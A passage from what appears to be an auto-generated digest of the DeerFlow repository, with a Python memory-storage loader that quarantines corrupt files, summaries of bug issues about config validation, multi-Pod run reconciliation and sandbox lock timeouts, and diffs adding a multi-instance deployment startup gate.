  ``memory.json.corrupt-<timestamp>`` before the loader returns ``None``.
  Quarantining keeps the content recoverable: returning ``None`` alone would
  make the next :meth:`save` rebuild the manifest from scratch (revision
  reset, no journal backup) and silently erase the unreadable state.

Writes still persist JSON (the write path is untouched). Hand-edited
Markdown files are therefore a *read-time* convenience: the next write
rewrites ``memory.json`` as JSON, so the Markdown rendering is temporary
until a Markdown write path lands.

This is intentionally a small, additive change scoped to the load path only:
the JSON UI and all other backends are untouched. Enabling it cannot break
existing deployments.
"""

from __future__ import annotations

import json
from datetime import datetime
from pathlib import Path
from typing import Any

from .markdown_format import _parse_markdown_memory
from .storage import FileMemoryStorage, logger


class MarkdownMemoryStorage(FileMemoryStorage):
    """File-backed storage whose summary loader tolerates corrupt/Markdown.

    Fully opt-in. Enable via ``memory.storage_class: markdown`` (or the full
    import path ``deerflow.agents.memory.backends.deermem.deermem.core.
    markdown_storage.MarkdownMemoryStorage``). The default JSON summary
    format is unchanged, so the existing JSON UI and all other backends keep
    working.
    """

    def _load_memory_file(self, path: Path) -> dict[str, Any] | None:
        if not path.exists():
            return None
        try:
            raw = path.read_text(encoding="utf-8")
        except (OSError, UnicodeError) as exc:
            logger.warning("Cannot read memory summary %s: %s", path, exc)
            return None

        parsed: dict[str, Any] | None = None
        try:
            value = json.loads(raw)
        except json.JSONDecodeError:
            value = None
        if isinstance(value, dict):
            parsed = value
        else:
            # Not a JSON object: the opt-in Markdown summary is accepted only
            # through its lossless fenced ```memory-json block. No structured
            # fallback -- a best-effort section parse cannot reproduce the
            # manifest schema (object-shaped user/history) and previously
            # crashed load()/save() on the files it claimed to tolerate.
            parsed = _parse_markdown_memory(raw)

        if parsed is not None:
            return parsed

        logger.warning(
            "Memory summary %s is unreadable (neither valid JSON nor a Markdown summary with a usable ```memory-json block); quarantining the file so its content stays recoverable instead of being silently overwritten by the next save.",
            path,
        )
        self._quarantine_unreadable(path)
        return None

    @staticmethod
    def _quarantine_unreadable(path: Path) -> None:
        """Move an unreadable summary aside; the next save rebuilds from scratch.

        Without this, returning ``None`` would let ``_commit_changes_locked``
        rebuild the manifest from ``create_empty_memory()`` and skip its
        recovery backup (which only runs when a current memory exists),
        silently destroying the previous state.
        """
        stamp = datetime.now().strftime("%Y%m%d-%H%M%S-%f")
        target = path.with_name(f"{path.name}.corrupt-{stamp}")
        try:
            path.replace(target)
            logger.warning("Quarantined unreadable memory summary as %s", target)
        except OSError as exc:
            # Quarantine is best-effort: keep the tolerant-read guarantee.
            logger.error("Could not quarantine unreadable memory summary %s: %s", path, exc)

```


### D2: Asynchronous State & Concurrency
- Analyzed concurrency guarantees, async pipelines, and event handling from PR resolutions and commit changes.

### D3: Error Boundaries, Recovery & Rollbacks
- Exception handling patterns and defect resolutions extracted from closed production bug issues:
- **Issue #6330** (2026-10-05): **[bug] Boolean true silently sets DeltaChannel snapshot_frequency to 1**
  *Symptoms*: ### Before you start  - [x] I searched [existing issues](https://github.com/bytedance/deer-flow/issues?q=is%3Aissue) and this is not a duplicate. - [x] I can reproduce this on the latest `main`.  ### Problem summary  database.checkpoint_delta.snapshot_frequency accepts YAML true as 1 instead of rejecting the invalid boolean.  ### Affected area(s)  Config / setup (make, config.yaml, env)  ### What happened?  On current main, CheckpointDeltaConfig(snapshot_frequency=True) is accepted and stores the value as integer 1. The deprecated database.checkpoint_delta_snapshot_frequency=True alias is also accepted. In delta mode, cadence 1 writes a full snapshot every step, defeating the configured storage reduction and increasing checkpoint growth.  ### Expected behavior  Both the current nested setting and the deprecated alias should reject booleans before Pydantic converts true to integer 1. Valid positive integer values and the default cadence should remain unchanged.  ### Steps to reproduce  1. Check out current upstream main at 7abb973f72cb1091df20edb15278b45b46297efd. 2. In backend, run:    ```python    from deerflow.config.database_config import CheckpointDeltaConfig, DatabaseConfig    print(CheckpointDeltaConfig(snapshot_frequency=True).snapshot_frequency)    print(DatabaseConfig(checkpoint_delta_snapshot_frequency=True).checkpoint_delta.snapshot_frequency)    ``` 3. Both expressions return 1 instead of raising ValidationError.  ### Relevant logs  ```shell True ACCEPTED as 1 int
  **Post-Mortem & Fix Analysis**:
  > Closing this issue as a duplicate of PR #6311, which already adds the same boolean rejection for CheckpointDeltaConfig.snapshot_frequency.

- **Issue #6327** (2026-10-05): **[bug] Multi-process startup gate is inert for one-worker-per-Pod replicas, so each Pod's orphan reconciliation kills peers' live runs**
  *Symptoms*: ### Before you start  - [x] I searched existing issues and this is not a duplicate. - [x] I can reproduce this on the latest `main`.  ### Problem summary  The Gateway's multi-process startup gate only looks at `GATEWAY_WORKERS` / `WEB_CONCURRENCY`, which count the uvicorn workers of **one process tree**. A Kubernetes Deployment with `replicas > 1` and one worker per Pod therefore passes every check, and each Pod's startup orphan reconciliation marks the other Pods' in-flight runs as crashed on every rolling update or scale-up.  ### Affected area(s)  - Backend API (gateway / endpoints / SSE) - Config / setup (make, config.yaml, env)  ### What happened?  `_enforce_postgres_for_multi_worker` in `backend/app/gateway/deps.py` returns early whenever the worker count is `<= 1`. With two Gateway instances sharing one Postgres database, each started with a single worker:  1. Instance A is executing a run. `run_ownership.heartbeat_enabled` is at its default (`false`), so the run row has a `NULL` lease. 2. Instance B starts (rolling update, scale-up, or a crash restart). 3. Instance B's startup orphan reconciliation treats every `pending`/`running` row with a null or expired lease as an orphan and flips it to `status=error`, `error="Gateway restarted before this run reached a durable final state."`, `stop_reason="orphan_recovered"`. 4. Instance A is still executing that run. Its SSE stream, `/wait` and the thread status now disagree with the worker that owns it.  Nothing refused this co

- **Issue #6200** (2026-10-04): **[bug] A stale notification worker can modify a delivery after it has been reclaimed**
  *Symptoms*: [repro_notification_fencing.py](https://github.com/user-attachments/files/32967055/repro_notification_fencing.py)   # [Bug] Notification outbox can be overwritten by a stale worker after delivery reclamation  ### Before you start  * I searched [[existing issues](https://github.com/bytedance/deer-flow/issues?q=is%3Aissue)](https://github.com/bytedance/deer-flow/issues?q=is%3Aissue) and this does not appear to be a duplicate. * I can reproduce this on the latest `main`.  ### Problem summary  A stale notification worker can modify a notification delivery after another worker has reclaimed it.  The notification delivery outbox currently does not fence stale workers when they finalize a delivery. After a delivery is reclaimed by another worker, the original worker can still call `mark_sent()` or `mark_failed()` using only the `delivery_id`.  As a result, a stale worker can overwrite the state of a delivery that is currently owned and being processed by another worker.  ---  ### Affected area(s)  * Backend persistence layer * Notification delivery outbox * Notification delivery claim/recovery lifecycle  ---  ### What happened?  Consider the following sequence:  ```text Worker A    │    ├── claim delivery    │    ▼ sending    │    ├── send notification to external platform    │    ├── crashes / stalls before mark_sent()    │    ▼ 10-minute stale timeout    │    ▼ reset_stale_sending_rows()    │    ▼ pending    │    ▼ Worker B claims the same delivery    │    ▼ sending    │    │    │
  **Post-Mortem & Fix Analysis**:
  > I would be happy to help fix this issue. I plan to add claim-token fencing to the notification delivery completion operations and regression tests for stale worker writes after a delivery is reset or reclaimed.

- **Issue #6044** (2026-09-30): **[bug] Streaming agent steps appear above the user message in a new chat**
  *Symptoms*: ### Before you start  - [x] I searched [existing issues](https://github.com/bytedance/deer-flow/issues?q=is%3Aissue) and this is not a duplicate. - [x] I can reproduce this on the latest `main`.  ### Problem summary  In a self-hosted private fork of DeerFlow, the agent's thinking and tool steps can temporarily appear above the user's question during the first turn of a new conversation. The message order becomes correct after the run finishes or the page is refreshed.  I have reproduced this in my fork, but have not verified it against upstream `main`.  ### Affected area(s)  Agents / LangGraph (graph, prompts, langgraph.json)  ### What happened?  In a self-hosted private fork of DeerFlow, the agent's thinking and tool steps can temporarily appear above the user's question during the first turn of a new conversation. The message order becomes correct after the run finishes or the page is refreshed.  I have reproduced this in my fork, but have not verified it against upstream `main`.  ### Expected behavior  The user message appears first, followed by the agent's thinking and tool steps.  ### Steps to reproduce  1. Open `/workspace/chats/new`. 2. Send a request that produces several thinking or tool steps, such as asking the agent to test `web_search` and `web_fetch`. 3. Watch the conversation while the run is streaming.  ### Relevant logs  ```shell None ```  ### How are you running DeerFlow?  Local (make dev)  ### Operating system  Linux  ### Platform details  _No response_  ##
  **Post-Mortem & Fix Analysis**:
  > <img width="711" height="409" alt="Image" src="https://github.com/user-attachments/assets/b7120dfd-cb7c-4611-80d3-b508edf97652" />

- **Issue #5933** (2026-09-27): **docs(harness): memory page lacks the MemoryManager architecture and backend integration guide**
  *Symptoms*: ### Before you start  - [x] I searched [existing issues](https://github.com/bytedance/deer-flow/issues?q=is%3Aissue) and this is not a duplicate. - [ ] I can reproduce this on the latest `main`.  ### Problem summary  memory page lacks the MemoryManager architecture and backend integration guide  ### Affected area(s)  Docs  ### What happened?  The harness memory page (`frontend/src/content/{zh,en}/harness/memory.mdx`) covers what memory stores, the two operation modes, and basic configuration — but it is silent on everything an integrator or backend evaluator needs:  1. **No explanation of the `MemoryManager` contract.** The pluggable backend    architecture (`manager.py`, the `manager_class` / `backend_config` split, tiered    contract, fail-fast resolution) is only documented in the internal    `agents/memory/AGENTS.md`, which users never see. Someone who wants to hook up their    own memory system (a database, an internal service, or a third-party product) has to    reverse-engineer the contract from source.  2. **No guidance on implementing a custom backend.** There is a short    "Custom storage backend" section about `storage_class`, but nothing that explains the    difference between swapping DeerMem's *storage layer* and integrating a *fully    independent memory backend* — two very different extension points that currently    read as one.  3. **No backend integration documentation.** Nothing explains how the default    `deermem` backend is wired in (factory assembly, h

- **Issue #5715** (2026-09-22): **[bug] DeepSeek Flash fails the managed-model connection test with valid credentials**
  *Symptoms*: ### Before you start  - [x] I searched [existing issues](https://github.com/bytedance/deer-flow/issues?q=is%3Aissue) and this is not a duplicate. - [ ] I can reproduce this on the latest `main`.  ### Problem summary  Adding `deepseek-flash` through Settings → Models fails the connection test against the official DeepSeek endpoint with valid credentials because the probe forces a named tool while DeepSeek thinking mode is enabled by default.  ### Affected area(s)  Backend API (gateway / endpoints / SSE), Config / setup (make, config.yaml, env), Frontend (UI / Next.js)  ### What happened?  With the following configuration, **Test connection** reports a failure:  | Field | Value | | --- | --- | | Interface type | OpenAI compatible | | Unique name / display name | `deepseek-flash` | | Base URL | `https://api.deepseek.com` | | Model ID | `deepseek-flash` | | API key | Valid key; omitted from this report | | Context window / max output tokens | Left unset | | Image input | Disabled |  The UI displays:  > 连接测试失败，请检查接口地址、凭据、模型 ID 以及流式输出和工具调用支持。  The probe returns `{"ok": false, "message": "connection_failed"}`, obscuring the provider's specific HTTP 400 error.  Direct checks with the same credentials established that authentication and the endpoint work: model listing and ordinary chat returned HTTP 200. A request forcing `connection_check` with default thinking returned HTTP 400; disabling thinking for that request returned HTTP 200 with a tool call.  ### Expected behavior  A valid 

- **Issue #5681** (2026-09-22): **[bug] Project-grouped chat rows push their kebab menu button outside the sidebar**
  *Symptoms*: ### Before you start  - [x] I searched [existing issues](https://github.com/bytedance/deer-flow/issues?q=is%3Aissue) and this is not a duplicate. - [x] I can reproduce this on the latest `main`.  ### Problem summary  In the sidebar's grouped Projects mode, the per-thread "More" (kebab) button of chats listed under a project is pushed past the sidebar's right edge and clipped.  ### Affected area(s)  Frontend (UI / Next.js)  ### What happened?  With the Projects section switched to grouped mode ("Group chats by project"), each project renders its chats as an indented nested list. The `…` action button on those rows is only partially visible: it sits a few pixels past the sidebar's visible area, so most of it is cut off and it is hard to click. Chats under the collapsed **Archived** group are nested one level deeper and their kebab is hidden completely.  Chats in the flat list (the default mode) are not affected — their kebab renders fully inside the sidebar.  **Before** (kebab clipped at the sidebar edge):  <img width="525" height="393" alt="Image" src="https://github.com/user-attachments/assets/5875d47a-47b2-46e5-a416-666a9459889d" />   **After** (with the fix applied):  <img width="318" height="153" alt="Image" src="https://github.com/user-attachments/assets/0626764a-a1f1-4b60-b1ac-885d415df4c2" />  ### Expected behavior  The kebab button of a project-grouped chat row should render fully inside the sidebar, exactly like the rows in the flat chat list.  ### Steps to reproduce 

- **Issue #5644** (2026-09-22): **[bug] AioSandbox list_dir can hold the sandbox lock for the SDK transport timeout**
  *Symptoms*: ### Before you start  - [x] I searched [existing issues](https://github.com/bytedance/deer-flow/issues?q=is%3Aissue) and this is not a duplicate. - [x] I can reproduce this on the latest `main`.  ### Problem summary  `AioSandbox.list_dir()` executes its remote `find` command through `shell.exec_command()` while holding the sandbox-wide serialization lock, but the request has no bounded `request_options`.  If the AIO request stalls or the relay stops making progress, `list_dir()` can therefore hold `AioSandbox._lock` for the SDK client's full transport timeout (currently up to 600 seconds), blocking later operations on the same sandbox client.  ### Affected area(s)  Sandbox / Docker  ### What happened?  The current path effectively does:  ```python with self._lock:     result = self._client.shell.exec_command(         command=command,         no_change_timeout=self._DEFAULT_NO_CHANGE_TIMEOUT,     ) ```  There is no request-level deadline or disabled retry budget.  This was reproduced during review of #5634: the SDK call received only the command and `no_change_timeout`, with the sandbox-wide lock held.  A quiet or stalled `find` can therefore block subsequent default-shell commands and other `list_dir()` calls until the SDK transport timeout expires.  ### Expected behavior  A `list_dir()` request should have a bounded host-side request lifetime so a wedged AIO request cannot monopolize the sandbox-wide serialization lock for the SDK's full transport budget.  On AIO images that
  **Post-Mortem & Fix Analysis**:
  > I’d like to work on this follow-up. 
  > Implementation is ready on my fork at `jamespud/deer-flow:fix/aio-list-dir-timeout` (`beb76b79`).  It is intentionally stacked on #5634 because it reuses the AIO timeout/status semantics introduced there. I’m holding off on opening the upstream PR until #5634 lands so the #5644 PR can be rebased onto `main` and reviewed as a single focused commit rather than including the parent PR’s diff.  Current validation:  * `test_aio_sandbox.py`: 112 passed * AIO/list-dir neighboring tests: 289 passed * `check_agent_guidance.py`: 0 errors * ruff lint/format: passed * real `all-in-one-sandbox:1.11.0` smoke: `list_dir` hard timeout terminated the remote `find`, released the lock immediately, and left subsequent commands usable 
  > The hold-the-lock-while-awaiting-remote pattern is the root issue: `list_dir` acquires the sandbox-wide lock and then awaits an unbounded AIO call inside it. My fix: (1) bound every in-lock call with explicit `request_options` so the worst-case hold time is known; (2) add a lease watchdog - if a holder exceeds its declared budget, waiters get a `lock_contention` error with holder diagnostics instead of blocking silently; (3) where possible, move the remote fetch outside the critical section (acquire, snapshot handle, release, await, revalidate). If the same unbounded-await pattern exists on other AIO entry points (e.g. shell command paths), the same bounding should apply. I'd include a regression test with a stalled relay fixture asserting the sandbox stays responsive. Your open PR #5634 covers the timeout half; happy to add the lease watchdog as a follow-up. Want me to take a crack at it? Happy to open a PR with working code.

### D4: Resource Lifecycle & Leak Defenses
- Memory allocation, socket lifecycle, and handle cleanup observed from bug fixes and PR deltas.

### D5: Boundary Deserialization & Encoding
- Schema deserialization, payload validation, and untrusted input guards.

### D6: Cross-Platform & Runtime Gotchas
- Platform variance, OS-specific gotchas, and environment discrepancies detected in issue reports.

### D7: Build, CI/CD, Deployment & Tooling
- Toolchain requirements, dependencies, and packaging specs verified against remote manifests.

### D8: Forensic Bug Fixes & Real Production Code Patches
Observed empirical fixes and code patches:

### Incident Patch 1: `5872d07e` (2026-10-05)
**Commit Message**: fix(gateway): gate declared multi-instance deployments and require the redis stream bridge (#6328)

* fix(gateway): gate declared multi-instance deployments and require the redis stream bridge

GATEWAY_WORKERS / WEB_CONCURRENCY only count the uvicorn workers of one
process tree, so a Kubernetes Deployment with replicas > 1 (one worker
per Pod) passed every multi-worker startup check while each Pod's
startup orphan reconciliation wrote the other Pods' lease-less runs off
as crashed on every rolling update.

Add `deployment.multi_instance` as an explicit declaration that runs the
same gate, plus a DEER_FLOW_MULTI_INSTANCE env override so deploy tooling
can set the declaration from its replica count without editing
config.yaml (wiring the Helm chart to export it is a separate change).
Both the worker count and the declaration now also require a Redis
stream bridge and refuse an explicit memory sandbox ownership store,
since the memory bridge and ownership store are process-local. The
agent-storage divergence warning, the inbound webhook dedupe warning and
the WeChat QR-login guard honor the same declaration.

* docs(changelog): link the multi-instance gate entry to #6328

* fix(ci): b

**File**: `CHANGELOG.md` (modified, +16/-0)
```diff
@@ -135,6 +135,21 @@ This release closes that milestone with **301 merged pull requests**.
   duplicate keys, and syntactically valid large numbers are allowed; a UTF-8 BOM
   is rejected. Syntax only — no schema or business-field checks; existing
   criteria and verdict semantics are unchanged. ([#5947])
+- **gateway:** The multi-process startup gate now fires on an explicit
+  `deployment.multi_instance: true` (or `DEER_FLOW_MULTI_INSTANCE=1`) as well
+  as `GATEWAY_WORKERS > 1`. The worker-count variables only see one process
+  tree, so a Kubernetes Deployment with several one-worker Pods passed every
+  check while each Pod's startup orphan reconciliation wrote the other Pods'
+  lease-less runs off as crashed on every rolling update. Both paths require
+  Postgres, `run_events.backend: db`, `run_ownership.heartbeat_enabled: true`
+  and now also a Redis stream bridge, and refuse an explicit
+  `sandbox.ownership.type: memory`, process-local browser tools and a
+  scheduler without `scheduler.multi_instance`. The agent-storage divergence
+  warning, the inbound webhook dedupe warning and the WeChat QR-login guard
+  honor the same declaration. **Behavior change:** `GATEWAY_WORKERS > 1` with
+  the memory stream bridge no longer starts; configure `stream_bridge.type:
+  redis` or `DEER_FLOW_STREAM_BRIDGE_REDIS_URL` (docker-compose and the Helm
+  chart already inject it). ([#6328])
 
 #### Memory
 
@@ -7799,3 +7814,4 @@ with **180 merged pull requests** since the first 2.0 milestone tag.
 [#6313]: https://github.com/bytedance/deer-flow/pull/6313
 [#6319]: https://github.com/bytedance/deer-flow/pull/6319
 [#6326]: https://github.com/bytedance/deer-flow/pull/6326
+[#6328]: https://github.com/bytedance/deer-flow/pull/6328
```

**File**: `README.md` (modified, +1/-1)
```diff
@@ -472,7 +472,7 @@ Browser login uses `HttpOnly` session cookies. The login page offers a "keep me
 DeerFlow still uses `Forwarded` / `X-Forwarded-*` headers to recover the browser-facing scheme and origin behind a proxy. The bundled nginx sets `X-Forwarded-Proto`, but preserves an upstream HTTPS value and does not overwrite every forwarded header. Configure the outer trusted proxy to replace or strip client-supplied forwarding headers before traffic reaches DeerFlow.
 
 > [!IMPORTANT]
-> The Gateway still owns active run tasks in process, so production defaults to a single Gateway worker (`GATEWAY_WORKERS=1`). Multi-worker deployments require Postgres, the Redis stream bridge (`stream_bridge.type: redis`), `run_ownership.heartbeat_enabled: true`, and `run_events.backend: db`; process-local memory/JSONL event stores cannot enforce singleton delivery receipts across workers. The bridge shares SSE delivery and bounded `Last-Event-ID` replay across workers. When a valid reconnect cursor has been trimmed, or a subscriber that already established an empty-stream wait falls behind before its first delivery, Memory and Redis emit a machine-readable SSE `gap` event instead of silently returning a partial replay; the Web UI reloads durable thread/event state and resumes from the retained tail. Lease reconciliation marks runs from dead workers as errors, persists their delivery receipts, publishes the terminal stream marker, schedules retained-stream cleanup, and updates the affected thread status. SSE, `/wait`, and internal stream consumers use `stream_bridge.heartbeat_interval_seconds` (default `15`) for idle liveness checks; changing it requires a Gateway restart. Malformed Redis reconnect IDs live-tail new events instead of replaying the retained buffer, and the rolling retained-buffer TTL (`stream_ttl_seconds`) remains a cleanup safety net rather than a run timeout. IM channel state and other process-local services still need their own multi-worker coordination.
+> The Gateway still owns active run tasks in process, so production defaults to a single Gateway worker (`GATEWAY_WORKERS=1`). Multi-worker deployments require Postgres, the Redis stream bridge (`stream_bridge.type: redis`), `run_ownership.heartbeat_enabled: true`, and `run_events.backend: db`; process-local memory/JSONL event stores cannot enforce singleton delivery receipts across workers. Kubernetes replicas run one worker per Pod, which the worker count cannot see: declare them with `deployment.multi_instance: true` (or `DEER_FLOW_MULTI_INSTANCE=1`, which deploy tooling such as a Helm chart can set from its replica count) so the startup gate enforces the same prerequisites instead of staying inert. The bridge shares SSE delivery and bounded `Last-Event-ID` replay across workers. When a valid reconnect cursor has been trimmed, or a subscriber that already established an empty-stream wait falls behind before its first delivery, Memory and Redis emit a machine-readable SSE `gap` event instead of silently returning a partial replay; the Web UI reloads durable thread/event state and resumes from the retained tail. Lease reconciliation marks runs from dead workers as errors, persists their delivery receipts, publishes the terminal stream marker, schedules retained-stream cleanup, and updates the affected thread status. SSE, `/wait`, and internal stream consumers use `stream_bridge.heartbeat_interval_seconds` (default `15`) for idle liveness checks; changing it requires a Gateway restart. Malformed Redis reconnect IDs live-tail new events instead of replaying the retained buffer, and the rolling retained-buffer TTL (`stream_ttl_seconds`) remains a cleanup safety net rather than a run timeout. IM channel state and other process-local services still need their own multi-worker coordination.
 >
 > In single-process JSONL deployments, cancelling an admitted event-store mutation waits for its background file I/O, rollback, and bookkeeping to settle before releasing the thread write lock. This prevents an older cancelled write from recreating deleted records or rolling back a later successful write. Cancellation can therefore wait on slow storage; it does not stop an in-flight filesystem operation. Callers still waiting to acquire the lock can cancel without starting a mutation. A batch spanning multiple threads drains its current thread group before propagating cancellation; subsequent thread groups do not start.
 >
```

**File**: `backend/AGENTS.md` (modified, +1/-0)
```diff
@@ -18,6 +18,7 @@ The backend runs a LangGraph-based super agent with sandbox execution, persisten
 - Scheduled tasks dispatch through the normal Gateway run path. `launch_scheduled_thread_run` reads `get_app_config()` at dispatch and passes `scheduler.recursion_limit` (default 1000, matching the web UI; clamped by `max_recursion_limit`), so YAML changes apply on the next run without restarting Gateway.
 - Run-history `status` filters are occurrence states, not task states. `ScheduledTaskRunStatus` in `persistence/scheduled_tasks/model.py` is the shared API/repository vocabulary and must match the active and terminal occurrence-status sets. Keep owner lookup before reading history, and apply SQL task/status predicates before pagination; omitted status preserves the existing response.
 - The background scheduler is single-instance by default. `scheduler.multi_instance=true` opts into lease-aware recovery across Gateway instances and requires shared Postgres, `run_ownership.heartbeat_enabled=true`, and `run_events.backend=db`; otherwise startup rejects the configuration. Live scheduled runs are preserved when a peer starts; expired launch claims return to the durable queue, expired run leases are atomically taken over, stale launch writes are fenced by lease ownership, and the Postgres advisory-locked budget makes `max_concurrent_runs` a shared global cap for `launching`/`running` rows.
+- The multi-process startup gate also fires on `deployment.multi_instance: true`; contract in `docs/CONFIGURATION.md`.
 - Long-running MCP work uses a separate durable task runtime (`McpTaskService` + `mcp_tasks`, lease-based recovery) rather than keeping remote task IDs or status polling inside the Agent loop; only submit remains Agent-visible, the database is the source of truth, and `ThreadState` receives only a bounded current-thread projection. Full contract (leases, cancellation fencing, delivery idempotency, management-tool exposure): [packages/harness/deerflow/mcp/AGENTS.md](packages/harness/deerflow/mcp/AGENTS.md).
 - MCP task notification retries, dead-lettering, and the cancel endpoint's worker-stopped 503 are part of that same contract — see [packages/harness/deerflow/mcp/AGENTS.md](packages/harness/deerflow/mcp/AGENTS.md).
 - Scheduled-task dispatch permits one active occurrence per task via `uq_scheduled_task_run_active` (`task_id WHERE status IN ('queued','launching','running')`). Durable `queued` rows survive restarts; only lease-fenced `launching` may call Gateway launch; `running` references the durable run. Stable admission idempotency keys reuse that run after recovery. Reused-thread `ConflictError` returns `launching` to `queued`; other launch errors become `failed`. Atomic queue claims enforce `max_concurrent_runs`, excluding waiting rows; the budget count and its UPDATE are separate statements, so writers must serialize before the count (Postgres advisory lock; SQLite `BEGIN IMMEDIATE`, whose deferred transaction otherwise reserves the writer only at the UPDATE) or claims on distinct rows overshoot the cap. Repeated triggers coalesce; same-thread FIFO blocks behind older active rows. Queue admission, PATCH/resume, pause and delete lock the parent before the occurrence, freezing active task definitions. Pause/delete atomically cancel `queued` work but reject `launching`/`running`; PATCH/resume reject all active states. Only queued conflicts offer pause cancellation. Manual triggers may queue/run while paused. Recovery locks task/run pairs in task-id/run-id order and restores `run_id`, `started_at` and live errors before releasing launch claims. Launch/failure/timeout updates use one parent-first transaction to prevent interleaved claims. Queue timeout fails the occurrence and advances scheduled work to prevent immediate requeue. Repository boundaries coerce serialized timestamps before SQL `DateTime` binding.
```

**File**: `backend/app/channels/dedupe_store.py` (modified, +8/-2)
```diff
@@ -17,6 +17,8 @@
 
 from sqlalchemy import text
 
+from deerflow.config.deployment_config import multi_instance_declaration
+
 logger = logging.getLogger(__name__)
 
 INBOUND_DEDUPE_TTL_SECONDS = 10 * 60
@@ -269,7 +271,11 @@ def make_inbound_dedupe_store(app_config: Any | None = None) -> InboundDedupeSto
         db_is_postgres = db_backend == "postgres"
 
     workers, worker_env = _gateway_workers()
-    multi_worker = workers > 1
+    # The worker count only sees one process tree; Kubernetes replicas declare
+    # themselves through deployment.multi_instance / DEER_FLOW_MULTI_INSTANCE.
+    declaration = multi_instance_declaration(app_config)
+    multi_worker = workers > 1 or declaration is not None
+    topology = f"{worker_env}>1" if workers > 1 else getattr(declaration, "knob", None)
 
     if backend == "postgres":
         if not db_is_postgres:
@@ -282,7 +288,7 @@ def make_inbound_dedupe_store(app_config: Any | None = None) -> InboundDedupeSto
     if backend == "memory":
         if multi_worker:
             logger.warning(
-                f"dedupe_storage=memory with {worker_env}>1: inbound webhook dedupe "
+                f"dedupe_storage=memory with {topology}: inbound webhook dedupe "
                 "is per-pod and will NOT drop redeliveries routed to a different replica. "
                 "Use dedupe_storage=postgres (or remove the setting to let 'auto' pick it) "
                 "for multi-worker deployments. See issue #4120."
```

**File**: `backend/app/gateway/AGENTS.md` (modified, +2/-2)
```diff
@@ -180,8 +180,8 @@ without changed outputs keep ordinary chat behavior. Journal mechanics
 (callback attribution, receipt idempotency and retries, orphan recovery):
 `packages/harness/deerflow/runtime/AGENTS.md`. Multi-worker deployments
 require `run_events.backend: db` for shared, ordered delivery events; the
-startup gate rejects process-local memory and JSONL event stores when
-`GATEWAY_WORKERS > 1`.
+startup gate rejects memory/JSONL event stores when `GATEWAY_WORKERS > 1`
+or `deployment.multi_instance: true`.
 
 **RunManager / RunStore contract**:
 - LangGraph-compatible run requests validate their supported subset before creating a run. `runtime/stream_modes.py` is the shared backend contract for public stream modes and the worker's `graph.astream` mapping; the public `messages-tuple` mode maps to LangGraph's internal `messages` mode, while public `messages`, `events`, and other unsupported modes are rejected instead of being dropped or replaced with `values`. `app/gateway/run_models.py::RunCreateRequest` is shared by HTTP and internal scheduled launch paths, retains only truthful compatibility defaults for unimplemented options (`if_not_exists="create"` plus `None` placeholders), returns 422 for unsupported values including `on_completion="complete"`, `on_completion="continue"`, and `multitask_strategy="enqueue"`, and forbids undeclared SDK options so fields such as `checkpoint_during` and `durability` cannot be silently discarded. A placeholder must still accept the stock SDK's own default: `langgraph_sdk` drops only `None` from its run payload, so `stream_resumable=False` reaches every request and means "non-resumable", which is what DeerFlow serves — rejecting it 422'd every IM channel run (#4466). `tests/test_run_request_validation.py::test_gateway_accepts_langgraph_sdk_default_payload` pins the real SDK payload against this boundary; channel tests mock the SDK client and cannot catch this class of drift.
```

**File**: `backend/app/gateway/deps.py` (modified, +85/-16)
```diff
@@ -29,6 +29,7 @@
 
 from deerflow.community.browser_automation.session import browser_multi_worker_error
 from deerflow.config.app_config import AppConfig, get_app_config
+from deerflow.config.deployment_config import multi_instance_declaration
 from deerflow.persistence.feedback import FeedbackRepository
 from deerflow.runtime import ORPHAN_RECOVERY_STOP_REASON, STARTUP_ORPHAN_RECOVERY_ERROR, RunContext, RunManager, StreamBridge
 from deerflow.runtime.events.store.base import RunEventStore
@@ -86,9 +87,55 @@ def _gateway_worker_count() -> tuple[int, str]:
     return 1, _WORKER_COUNT_ENV_VARS[0]
 
 
+def _multi_process_signal(config: AppConfig) -> tuple[str, str] | None:
+    """Return ``(reason, rollback)`` when this process must assume peer Gateway processes.
+
+    ``reason`` names the knob that established the topology (``GATEWAY_WORKERS=2``,
+    ``DEER_FLOW_MULTI_INSTANCE=1`` or ``deployment.multi_instance=true``) and
+    ``rollback`` is the single-instance remediation a refusal message offers.
+    When the worker count and a declaration are both active, ``rollback``
+    withdraws both: resetting only the worker count would bounce the operator
+    through a second refusal on the declaration at the next start.
+
+    The worker-count variables only see one process tree, so a Kubernetes
+    Deployment with ``replicas > 1`` and one worker per Pod is invisible to
+    them; the explicit declaration exists for exactly that topology.
+    """
+    workers, worker_env = _gateway_worker_count()
+    declaration = multi_instance_declaration(config)
+    if workers > 1:
+        rollback = f"Set {worker_env}=1"
+        if declaration is not None:
+            rollback = f"{rollback} and {declaration.rollback}"
+        return f"{worker_env}={workers}", rollback
+    if declaration is None:
+        return None
+    step = declaration.rollback
+    return declaration.knob, f"{step[0].upper()}{step[1:]} and run a single Gateway instance"
+
+
+def _stream_bridge_is_cross_process(config: AppConfig) -> bool:
+    """Return whether live run events can reach SSE clients on every instance.
+
+    Mirrors ``runtime/stream_bridge/async_provider.py::_resolve_config``: the
+    config.yaml section wins, and an omitted section falls back to the
+    ``DEER_FLOW_STREAM_BRIDGE_REDIS_URL`` variable the Docker and Helm
+    deployments inject.
+    """
+    bridge = getattr(config, "stream_bridge", None)
+    if bridge is not None:
+        return getattr(bridge, "type", None) == "redis"
+    return bool((os.environ.get("DEER_FLOW_STREAM_BRIDGE_REDIS_URL") or "").strip())
+
+
 def _enforce_postgres_for_multi_worker(config: AppConfig) -> None:
     """Refuse unsafe multi-process configurations before persistence starts.
 
+    A deployment counts as multi-process when ``GATEWAY_WORKERS`` /
+    ``WEB_CONCURRENCY`` is above 1, or when the operator declares peers with
+    ``deployment.multi_instance: true`` / ``DEER_FLOW_MULTI_INSTANCE=1`` (the
+    worker count cannot see other Pods, and a Pod that starts next to a peer
+    without these prerequisites writes the peer's live runs off as orphans).
     Multi-instance scheduler recovery also needs the durable run ownership
     contract even when each Pod runs a single Gateway worker.
 
@@ -105,13 +152,16 @@ def _enforce_postgres_for_multi_worker(config: AppConfig) -> None:
        every run has a NULL lease, so reconciliation treats all inflight
        runs as orphans and Worker B would kill Worker A's live runs on
        every rolling update or scale-up.
+    6. The stream bridge must be Redis. The memory bridge is process-local,
+       so SSE streams, reconnects and ``/wait`` only work on the owner.
+    7. ``sandbox.ownership.type`` must not be an explicit ``memory``: an
+       in-process ownership store cannot see peers, so reconciliation would
+       adopt and idle-destroy another instance's live containers (#4206).
 
     This gate runs once at startup before any persistence engine is
     initialised so the error message is clear and the process exits
     immediately.
     """
-    workers, worker_env = _gateway_worker_count()
-
